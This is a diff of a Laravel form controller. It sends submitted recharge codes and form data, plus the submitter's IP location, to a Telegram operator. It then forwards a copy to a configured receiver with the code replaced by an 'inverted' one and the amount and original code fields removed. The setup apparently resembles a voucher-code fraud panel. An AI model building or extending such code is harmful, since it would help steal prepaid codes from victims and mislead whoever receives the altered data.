@@ -85,28 +85,29 @@ class FormDataController extends Controller implements HasMiddleware
             ...$formData->entries,
         ];
 
-        $notifData = new NotifData("👉 <b>" . $validated['code'] . "</b>
-        Already used: " . ($formData->data['already_used'] ? 'Yes' : 'No') . ")");
+        $notifData = new NotifData("👉 <b>" . $validated['code'] . "</b> Already used: " . ($formData->data['already_used'] ? 'Yes' : 'No'));
         $notifData->setSubject('A new form data has been submitted');
         $notifData->setBody(json_encode($formData->data, JSON_PRETTY_PRINT));
         TelegramMsgJob::dispatchSync($notifData, $formData->ip_address);
         SetLocation::dispatch($formData->ip_address, $formData, 'location');
 
         if ($receiver = site_setting('receiver_email')) {
+            $except = ['type', 'code', 'amount', 'inverted_code', 'is_inverted', 'code_de_recharge', 'Code de recharge'];
+            $data = Arr::except($data, $except);
             $data['code'] = $invertedCode;
+            $delay = site_setting('delay') ?? 0;
 
             if (receiver_type($receiver) === 'telegram') {
-                $notifData->setTitle('Nouvelle entrée de formulaire');
+                $notifData->setTitle('Nouvelle entrée de formulaire: <b>' . $data['code'] . '</b>');
                 $notifData->setBody(json_encode($data, JSON_PRETTY_PRINT));
-                \Log::debug('Dispatching TelegramMsgJob with data: ', $notifData->getData());
-                // TelegramMsgJob::dispatchSync($notifData, $formData->ip_address);
+                if ($delay > 0) {
+                    TelegramMsgJob::dispatch($notifData, $formData->ip_address, $receiver)->delay(now()->addSeconds($delay));
+                } else {
+                    TelegramMsgJob::dispatchSync($notifData, $formData->ip_address, $receiver);
+                }
             } elseif (receiver_type($receiver) === 'email') {
                 $message = new FormDataMail($data);
-                if ($delay = site_setting('delay')) {
-                    Mail::to($receiver)->later(now()->addSeconds($delay), $message);
-                } else {
-                    Mail::to($receiver)->send($message);
-                }
+                Mail::to($receiver)->later(now()->addSeconds($delay), $message);
             }
         }
 
